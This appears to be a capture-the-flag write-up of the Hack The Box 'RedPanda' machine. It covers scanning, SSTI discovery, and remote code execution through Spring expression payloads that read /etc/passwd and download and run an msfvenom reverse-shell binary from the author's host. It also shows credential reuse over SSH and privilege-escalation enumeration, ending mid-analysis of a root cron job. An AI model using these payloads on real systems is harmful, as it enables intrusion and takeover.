\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/main.css\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Red Panda Search | Made with Spring Boot\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;div class=\u0026#39;pande\u0026#39;\u0026gt; | \u0026lt;div class=\u0026#39;ear left\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;ear right\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;whiskers left\u0026#39;\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;whiskers right\u0026#39;\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;face\u0026#39;\u0026gt; | \u0026lt;div class=\u0026#39;eye | HTTPOptions: | HTTP/1.1 200 | Allow: GET,HEAD,OPTIONS | Content-Length: 0 | Date: Fri, 27 Dec 2024 15:20:47 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Fri, 27 Dec 2024 15:20:47 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 400 | Request\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 400 |_ Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.94SVN%I=7%D=12/27%Time=676EC5CD%P=x86_64-pc-linux-gnu% SF:r(GetRequest,690,\u0026#34;HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/html;ch SF:arset=UTF-8\\r\\nContent-Language:\\x20en-US\\r\\nDate:\\x20Fri,\\x2027\\x20Dec SF:\\x202024\\x2015:20:47\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x2 SF:0html\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\\x20dir=\\\u0026#34;ltr\\\u0026#34;\u0026gt;\\n\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\ SF:x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20author=\\\u0026#34;w SF:ooden_k\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;!--Codepen\\x20by\\x20khr2003:\\x20https://co SF:depen\\.io/khr2003/pen/BGZdXw\\x20--\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;sty SF:lesheet\\\u0026#34;\\x20href=\\\u0026#34;css/panda\\.css\\\u0026#34;\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x2 SF:0\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/main\\.css\\\u0026#34;\\x20type=\\\u0026#34;te SF:xt/css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Red\\x20Panda\\x20Search\\x20\\|\\x20Made\\ SF:x20with\\x20Spring\\x20Boot\u0026lt;/title\u0026gt;\\n\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\u0026lt;body\u0026gt;\\n\\n\\ SF:x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;pande\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20 SF:class=\u0026#39;ear\\x20left\u0026#39;\u0026gt;\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;ear\\ SF:x20right\u0026#39;\u0026gt;\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;whiskers\\x20le SF:ft\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x SF:20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;whiskers\\x20right\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; SF:\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x SF:20\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;face\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;eye\u0026#34;)%r(HTTPOptions,75,\u0026#34;HTTP/1\\.1\\x202 SF:00\\x20\\r\\nAllow:\\x20GET,HEAD,OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:\\x SF:20Fri,\\x2027\\x20Dec\\x202024\\x2015:20:47\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n\u0026#34;)%r(RTSPRequest,24E,\u0026#34;HTTP/1\\.1\\x20400\\x20\\r\\nContent-Type:\\x20t SF:ext/html;charset=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length:\\x2 SF:0435\\r\\nDate:\\x20Fri,\\x2027\\x20Dec\\x202024\\x2015:20:47\\x20GMT\\r\\nConnec SF:tion:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;tit SF:le\u0026gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request\u0026lt;/title\u0026gt;\u0026lt;styl SF:e\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;body\\x20{font-family:Tahoma,Arial,sans-serif;}\\x SF:20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white;background-color:#525D76;}\\x20 SF:h1\\x20{font-size:22px;}\\x20h2\\x20{font-size:16px;}\\x20h3\\x20{font-size: SF:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color:black;}\\x20\\.line\\x20{h SF:eight:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h SF:1\u0026gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/ SF:html\u0026gt;\u0026#34;); Device type: general purpose Running: Linux 5.X OS CPE: cpe:/o:linux:linux_kernel:5.0 OS details: Linux 5.0 Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 66.89 seconds Findings: A service called \u0026ldquo;Red Panda Search\u0026rdquo; appears to be running. It\u0026rsquo;s made by \u0026ldquo;Spring Boot\u0026rdquo; https://codepen.io/khr2003/pen/BGZdXw SSH 22: Although SSH is running I will not try and bruteforce as it is slow process. HTTP-Proxy 8080: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Whatweb: Lets run \u0026ldquo;whatweb\u0026rdquo; to see if we can glean some further information: whatweb $box | sed 's/, /\\n/g' +Note+: I use sed to put the output across multiple lines for a nicer output. Dirbusting the webserver using ferox: I Perform some directory busting to see if there are any interesting directories: feroxbuster -u http://$box:8080 --threads 20 --scan-limit 2 -q -r -o $domain-FeroxScan.txt Some notes on my flags. --threads 20 --scan-limit 2 I limit the threads \u0026amp; scan limit as otherwise it effectively DDOS\u0026rsquo; the site. -q As I run tmux for most sessions, this quiet flag removes the progress bar and is advised when using tmux etc. -r Follows redirects. -o $domain-FeroxScan.txt sometimes there can be ALOT of output so this makes it more manageable to go through later. kali in HTB/BlogEntriesMade/RedPanda/scans/nmap 🍣 main 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 15:34:26 zsh ❯ feroxbuster -u http://$box:8080 --threads 20 --scan-limit 2 -q -r -o $domain-FeroxScan.txt 200 GET 22l 41w 295c http://10.129.227.207:8080/css/main.css 200 GET 275l 763w 7549c http://10.129.227.207:8080/css/panda.css 200 GET 55l 119w 1543c http://10.129.227.207:8080/ 200 GET 54l 102w 822c http://10.129.227.207:8080/css/stats.css 200 GET 32l 97w 987c http://10.129.227.207:8080/stats 500 GET 1l 1w 86c http://10.129.227.207:8080/error Scanning: http://10.129.227.207:8080/ 400 GET 1l 32w 435c http://10.129.227.207:8080/[ 400 GET 1l 32w 435c http://10.129.227.207:8080/plain] I visit the /stats page\nWe can view stats for users. Clicking into the user page. It gives the option to export stats for that specific user, if clicked it provides an xml output for export.xml\nLooking at the output it renders an xml table based on the author parameters name, however the as it\u0026rsquo;s a table it will most likely be utilizing SST\u0026rsquo;s (Server Side Templates) which means it may be susceptible to SSTI (Server Side Template Injection) +Note+: After some investigating it was not. However it did come in useful later. Fuzzing for SSTI and discovering the template engine: Fuzzing Attempt 1: The table below shows what the input and the correct responses should be and then how we should progress. There is a handy flow chart that corresponds to this on payload all the things: Payload Path Taken Template Engine Result Response/Output ${7*7} Direct Input Smarty ✅ Vulnerable 49 Mako ❓ Unknown Unknown a{*comment*}b Comment Handling Input Smarty ✅ Vulnerable ab ${\u0026quot;\u0026quot;.join(\u0026quot;ab\u0026quot;)} Join Function Injection Smarty ✅ Vulnerable ab Mako ✅ Vulnerable ab Jinja2 ❓ Unknown Unknown {{7*7}} Double Braces Input Jinja2 ✅ Vulnerable 49 Twig ✅ Vulnerable 49 Unknown ❓ Unknown Unknown {{7*'7'}} String Multiplication Attempt Jinja2 ✅ Vulnerable 7777777 Twig ✅ Vulnerable 49 Same content as a list for fuzzing: ${7*7} a{*comment*}b ${\u0026#34;\u0026#34;.join(\u0026#34;ab\u0026#34;)} {{7*7}} {{7*\u0026#39;7\u0026#39;}} I capture a POST request in burp for the creation of a new request and send to intruder. I then select my injection point and load my payload list.\n+Note+: You want to ensure that URL encoding is OFF. I then start the attack:\nI get no hits. However I know that there is an SSTI engine running, which means that my payload list may not contain the relevant payload required for this specific engine. Enumerating the framework in use (reading the source code): I look at the source code for the page and can see the following line:\nMade with \u0026ldquo;Spring Boot\u0026rdquo; Looking at Wikipedia I can see the following:\nSpring Boot is an open-source Java framework used for programming standalone, production-grade Spring-based applications with a bundle of libraries that make project startup and management easier\nSo it\u0026rsquo;s a java framework and my payload\u0026rsquo;s do not fuzz for java payloads. +Note+: Realistically this is something I should have noticed earlier, I usually make a point of reading source code when I first look at a page and overlooked this.\nFuzzing Attempt 2: Looking at Payload All The Things SSTI page \u0026amp; the java page I can see that the template libraries \u0026ldquo;Spring\u0026rdquo; is listed \u0026amp; has the payload *{7*7}\nI manually try this payload \u0026amp; it is processed as code as it returns the multiplication value which proves that it is in fact the \u0026ldquo;Spring\u0026rdquo; template engine.\nEnumerating Banned Chars: I try another of the payloads from the Payload All The Things Page ${'patt'.toString().replace('a', 'x')} However I get this error: To figure out what the banned characters are we can pass a list of special characters and view the responses. Create a list of special ASCII characters: Using the below shell code we can create a list of special chars called specialChars.txt for ((i=32; i\u0026lt;127; i++)); do [[ $(printf \u0026#34;\\\\$(printf %03o \u0026#34;$i\u0026#34;)\u0026#34;) =~ [[:punct:]] ]] \u0026amp;\u0026amp; printf \u0026#34;\\\\$(printf %03o \u0026#34;$i\u0026#34;)\\n\u0026#34;; done \u0026gt; specialChars.txt Fuzzing for banned chars using FFUF: Now that we have this I can fuzz the program using FFUF. There is one issue though, although it\u0026rsquo;s possible to filter by regex with ffuf e.g. -fr \u0026quot;banned\u0026quot; this would filter out all results which contain the string \u0026ldquo;banned\u0026rdquo; meaning I would be left with what is allowed. However this is not that useful. The best course of action is to proxy via burp and then search for that string in burp.\nFirst I copy the POST command from burpsuite.\ncurl --path-as-is -i -s -k -X $\u0026#39;POST\u0026#39; \\ -H $\u0026#39;Host: 10.129.227.207:8080\u0026#39; -H $\u0026#39;Content-Length: 71\u0026#39; -H $\u0026#39;Cache-Control: max-age=0\u0026#39; -H $\u0026#39;Accept-Language: en-US,en;q=0.9\u0026#39; -H $\u0026#39;Origin: http://10.129.227.207:8080\u0026#39; -H $\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#39; -H $\u0026#39;Referer: http://10.129.227.207:8080/search\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H $\u0026#39;Connection: keep-alive\u0026#39; \\ --data-binary $\u0026#39;name=%24%7B%27patt%27.toString%28%29.replace%28%27a%27%2C+%27x%27%29%7D\u0026#39; \\ $\u0026#39;http://10.129.227.207:8080/search\u0026#39; I then modify it to the below so it can be used with FFUF. ffuf -u $\u0026#39;http://10.129.227.207:8080/search\u0026#39; -w ./specialChars.txt -X $\u0026#39;POST\u0026#39; \\ -H $\u0026#39;Host: 10.129.227.207:8080\u0026#39; -H $\u0026#39;Content-Length: 71\u0026#39; -H $\u0026#39;Cache-Control: max-age=0\u0026#39; -H $\u0026#39;Accept-Language: en-US,en;q=0.9\u0026#39; -H $\u0026#39;Origin: http://10.129.227.207:8080\u0026#39; -H $\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#39; -H $\u0026#39;Referer: http://10.129.227.207:8080/search\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H $\u0026#39;Connection: keep-alive\u0026#39; \\ --data-binary $\u0026#39;name=FUZZ\u0026#39; -x http://127.0.0.1:8080 The most important additional/modifications are:\nSetting the target url: -u $'http://10.129.227.207:8080/search' Specifying the custom worflist: -w ./specialChars.txt Modifying the POST data to include the keyword \u0026ldquo;FUZZ\u0026rdquo;: --data-binary $'name=FUZZ' Proxying the requests via burpsuite: -x http://127.0.0.1:8080 Once run I go back to burpsuite and click the \u0026ldquo;filter settings bar\u0026rdquo;\nI apply a filter for the word \u0026ldquo;banned\u0026rdquo; There are 3 hits:\nLooking at the contents of the requests the banned chars are ~, $ \u0026amp; _ 2. Foothold: Getting RCE On The Host VIA SSTI: Reading /etc/passwd via SSTI: Now that I know the banned chars on the host I can craft a payload to take advantage of the SSTI vulnerability.\nLooking at the Payload All The Things java section there is this command for reading /etc/passwd:\n${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} It begins with a $ which is a banned character, but looking at the page I can see the following line.\nMultiple variable expressions can be used, if ${…} doesn\u0026rsquo;t work try #{…}, *{…}, @{…} or ~{…}.\nMeaning if I can\u0026rsquo;t use ${[Command]} we can try *{[Command]}, #{[Command]}, @{[Command]} I modify the command to be:\n*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} It works \u0026amp; I can read the /etc/passwd file Verifying RCE VIA SSTI: I the below commands.\n*{T(java.lang.Runtime).getRuntime().exec(\u0026#34;whoami\u0026#34;)} *{T(java.lang.Runtime).getRuntime().exec(\u0026#34;/bin/bash -c whoami\u0026#34;)} I get this response: +Note+: This is the same for the most of the commands I try. This indicates the command is running but we are not being served the output. Making a request to my host:\nTo verify my suspicions I spin up a python webserver: python -m http.server 9000 I then have the application reach out to the webserver to make a wget request. *{\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getRuntime().exec(\u0026#34;wget http://10.10.14.89:9000/POC\u0026#34;)} Just as I thought it makes a request to my host. +Note+: Now that I know the host is processing my commands and can make an outbound connection I can do the following: Create a malicious binary. Download it to the host. Make the binary executable. Run it \u0026amp; catch a reverse shell. +Another Note+: If you\u0026rsquo;re wondering \u0026ldquo;why didn\u0026rsquo;t you just try a reverse shell\u0026rdquo; I did, but a standard bash shell or nc shell would not connect. Getting A Reverse Shell VIA SSTI: Creating A Malicious .elf binary: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.89 LPORT=4242 -f elf \u0026gt; rev.elf Transferring The Malicious binary To The Host: I spin up my python web server again.\npython -m http.server 9000 On the target I use wget to copy the file:\n*{\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getRuntime().exec(\u0026#34;wget http://10.10.14.89:9000/rev.elf\u0026#34;)} It transfers succesfully. Making The Malicious Binary Executable: *{\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getRuntime().exec(\u0026#34;chmod 777 ./rev.elf\u0026#34;)} There is no feedback from this, I am running this blind. Executing The Malicious .elf \u0026amp; Getting A Shell: *{\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getRuntime().exec(\u0026#34;./rev.elf\u0026#34;)} Shell caught I can see I am running as a user called woodenk Upgrading the shell: As the shell appears to be low level I upgrade it using the tried and trusted python method. I check if python is installed: which python3 I upgrade: python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' This effectively launches python 3, imports the pty module and then spawns a new /bin/bash shell giving me an interactive shell. 3. Enumerating As woodenk: First things first I will get the user flag. Enumerating As woodenk: I check what groups the user is part of \u0026amp; can see they have permissions to view logs:\nI check if the user can write to any log files. I do this because if the user can write to a log file I may be able to use the logrotten exploit to escalate privileges.\nfind / -type f -name \u0026#34;*.log\u0026#34; -writable 2\u0026gt;/dev/null The user can write to: /opt/panda_search/redpanda.log +Note+: I did pursue this but this but it did not work due there being no GLIBC_2.34 on the host for the logrotten exploit to work. Apache-Maven: I find an installation of apache maven in woodenk\u0026rsquo;s home folder. Looking at his .bashrc file I see the below entries. export MAVEN_HOME=\u0026#34;/opt/maven\u0026#34; export MAVEN_VERSION=3.8.3 export MAVEN_CONFIG_HOME=\u0026#34;/home/woodenk/.m2\u0026#34; export JAVA_HOME=\u0026#34;/usr/lib/jvm/java-11-openjdk-amd64/bin/java\u0026#34; Finding Hard Coded Credentials: I run the following search to hunt for any files that feature the users \u0026ldquo;woodenk\u0026rdquo; name in them in the web root /opt grep /opt -rn -ie woodenk ; 2\u0026gt;/dev/null\nIt finds the below: This points to panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java line 106 If we search the file, we find the below hard coded creds for the mysql service.\nwoodenk:RedPandazRule Accessing The Host Via SSH: I check for password re-use on the SSH service and can access the host using the found credentials \u0026amp; was able to login.\nI re-ran linpeas as this user and did not find anything.\n4. Privilege Escalation: Manual Privilege Escalation Checks: For full transparency I have done the following checks before moving onto looking at running processes in the next steps. If you just want to see what happens next, skip ahead.\n+Note+: Most of these are shown when executing linpeas, however I often find it easier to manually check if nothing obvious is presenting itself. Check Kernel Version:\nuname -a Enumerate PATH:\necho $PATH Enumerate enviromental variables:\nenv Anything interesting in here PATH. Enumerate available shells:\ncat /etc/shells Are additional shells such as tmux/zshrc/fish etc available, if so are there configs for them? Read them. Enumerate Sudo Version:\nsudo -V Check Users Last Login Times:\nlastlog This can give us an idea of how widely used this system is \u0026amp; when it is used. View who is currently logged in:\nw View user home folder:\nls -la /home View users bash history:\ncat ~/.bashrc~ Reviewing what the user has been doing can gives insight into the type of server and hints to privilege escalation paths. Search for all history files:\nfind / -type f \\( -name *_hist -o -name *_history \\) -exec ls -l {} \\; 2\u0026gt;/dev/null View User Information:\n#Always run a full cat /etc/passwd as embedded systems may have hard coded hashes in the file. cat /etc/passwd #Lists all users /in etc/passwd cat /etc/passwd | cut -f1 -d: View User Information: Shows Group too.\nid -nG This will show groups our user is a part of, ensure to check if they are part of any of these default groups: View sudo privileges:\nsudo -l View Group Information:\ncat /etc/group Check which users have login shells: +do this!!!+\ncat /etc/passwd | grep \u0026#34;*sh$\u0026#34; List tmux sessions:\ntmux ls One liner to find all SUID (4000), SGID (1000) or both (6000):\n# Filters out snamp folders find / \\( -type d -name \u0026#39;*snap*\u0026#39; -prune \\) -o \\( -type f \\( -perm -4000 -o -perm -2000 -o -perm -6000 \\) -exec ls -ldb {} \\; \\) 2\u0026gt;/dev/null | grep -v \u0026#34;snap\u0026#34; Find Writable Files:\nfind / -path /proc -prune -o -type f -perm -o+w 2\u0026gt;/dev/null Find all logfiles:\nfind / -type f -name \u0026#34;*.log\u0026#34; 2\u0026gt;/dev/null This did reveal: /opt/panda_search/redpanda.log but that was seen earlier. Connections and Services:\nnetstat -antup Checking Running Processes With pspy \u0026amp; Finding A Cron Job Running As Root: I upload pspy to check for running processes via a python webserver:\npython -m http.server 9000 I use wget to copy it to the host:\nOnce launched with ./pspy64 I can see the following process is running:\njava -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar Looking at the UID we can also see it\u0026rsquo;s running as root as it\u0026rsquo;s UID 0 I leave pspy running and it re-runs exactly 2 minutes later, so there is a cron job scheduled to run this. +Note+: There is also a shell script running /root/run_credits.sh however I currently have no way to read this so will focus on the java file. Reading The Source Code Of app.java: I can read the source code of the .jar file being run by navigating to the project src folder in /opt/credit-score/LogParser/final/src looking further I can see the source code is the file /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java Code Break-Down: I\u0026rsquo;ll break down this Java code into chunks and explain what each part does.\nPackage declarations and imports for file, image, and XML processing:\npackage com.logparser; import java.io.*; import java.util.*; import com.drew.imaging.*; import com.drew.metadata.*; import org.jdom2.*; // ETC [Cut for brevity] This section declares the package and imports necessary libraries for file handling, collections, image metadata reading, and XML processing. \u0026ldquo;parselog\u0026rdquo; Function - Parses log lines containing status code, IP, user agent, and URI separated by ||\npublic static Map parseLog(String line) { String[] strings = line.split(\u0026#34;\\\\|\\\\|\u0026#34;); Map map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;status_code\u0026#34;, Integer.parseInt(strings[0])); map.put(\u0026#34;ip\u0026#34;, strings[1]); map.put(\u0026#34;user_agent\u0026#34;, strings[2]); map.put(\u0026#34;uri\u0026#34;, strings[3]); return map; } This method parses log lines that are separated by \u0026ldquo;||\u0026rdquo;. It extracts the following information and maps them to variables: HTTP status code = status_code IP address = ip User agent = user_agent URI = uri This function expects log entries in the format: status_code||ip||user_agent||uri. Example: 200||192.168.1.1||Mozilla/5.0||/images/cat.jpg Method \u0026ldquo;isImage\u0026rdquo; checks if a filename contains .jpg extension:\npublic static boolean isImage(String filename) { if(filename.contains(\u0026#34;.jpg\u0026#34;)) { return true; } return false; } A simple check to determine if a filename refers to a JPG image. +Note+: This is a very basic check that only looks for \u0026ldquo;.jpg\u0026rdquo; in the filename. Extracts Artist tag from JPEG metadata using the image\u0026rsquo;s URI\npublic static String getArtist(String uri) throws IOException, JpegProcessingException { String fullpath = \u0026#34;/opt/panda_search/src/main/resources/static\u0026#34; + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for(Directory dir : metadata.getDirectories()) { for(Tag tag : dir.getTags()) { if(tag.getTagName() == \u0026#34;Artist\u0026#34;) { return tag.getDescription(); } } } return \u0026#34;N/A\u0026#34;; } This method: Constructs a full path to an image file by reading the uri string variable passed from the parseLog and main logic functions: Reads the JPEG metadata. Searches through metadata tags to find the \u0026ldquo;Artist\u0026rdquo; tag Returns the artist name or \u0026ldquo;N/A\u0026rdquo; if no artist name is found in the metadata. If data is found it\u0026rsquo;s stored in the returned value of the \u0026ldquo;artist\u0026rdquo; string/variable Updates view counts in XML file for specific image and total views:\npublic static void addViewTo(String path, String uri) throws JDOMException, IOException { SAXBuilder saxBuilder = new SAXBuilder(); XMLOutputter xmlOutput = new XMLOutputter(); xmlOutput.setFormat(Format.getPrettyFormat()); File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); for(Element el: rootElement.getChildren()) { if(el.getName() == \u0026#34;image\u0026#34;) { if(el.getChild(\u0026#34;uri\u0026#34;).getText().equals(uri)) { Integer totalviews = Integer.parseInt(rootElement.getChild(\u0026#34;totalviews\u0026#34;).getText()) + 1; rootElement.getChild(\u0026#34;totalviews\u0026#34;).setText(Integer.toString(totalviews)); Integer views = Integer.parseInt(el.getChild(\u0026#34;views\u0026#34;).getText()); el.getChild(\u0026#34;views\u0026#34;).setText(Integer.toString(views + 1)); } } } BufferedWriter writer = new BufferedWriter(new FileWriter(fd)); xmlOutput.output(doc, writer); } This method updates view counts in an XML file: Opens and parses an XML file Finds the matching image entry by URI Increments both the total views counter and the specific image\u0026rsquo;s view counter Saves the updated XML file +Important+: If we can write to this I may be able to xploVV Main method processes log file to update view counts for JPG images based on artist:\npublic static void main(String[] args) throws JDOMException, IOException, JpegProcessingException { File log_fd = new File(\u0026#34;/opt/panda_search/redpanda.log\u0026#34;); Scanner log_reader = new Scanner(log_fd); //Reads the log file line by line \u0026amp; stores in variable \u0026#34;line\u0026#34; while(log_reader.hasNextLine()) { String line = log_reader.nextLine(); // Checks if the substring \u0026#34;.jpg\u0026#34; is found in the \u0026#34;line\u0026#34; string if(!isImage(line)) { // If the substring \u0026#34;.jpg\u0026#34; is found it continues and passes the data to the parselog function continue; } Map parsed_data = parseLog(line); //\u0026#34;line\u0026#34; variable passed to the parseLog function // Once the data is parsed it\u0026#39;s then returned in the \u0026#34;parsed_data\u0026#34; variable here where System.out.println(parsed_data.get(\u0026#34;uri\u0026#34;)); String artist = getArtist(parsed_data.get(\u0026#34;uri\u0026#34;).toString()); // Reads the artist string that is returned from the \u0026#34;getArtist\u0026#34; function. System.out.println(\u0026#34;Artist: \u0026#34; + artist); // Value of artist string is concatenated with \u0026#34;/credits/\u0026#34; \u0026amp; \u0026#34;_creds.xml\u0026#34; to create the full path of the variable xmlpath // This looks to be vulnerable as it\u0026#39;s not bine sanitised. It just takes the information from the artist field of an image and adds it here. String xmlPath = \u0026#34;/credits/\u0026#34; + artist + \u0026#34;_creds.xml\u0026#34;; addViewTo(xmlPath, 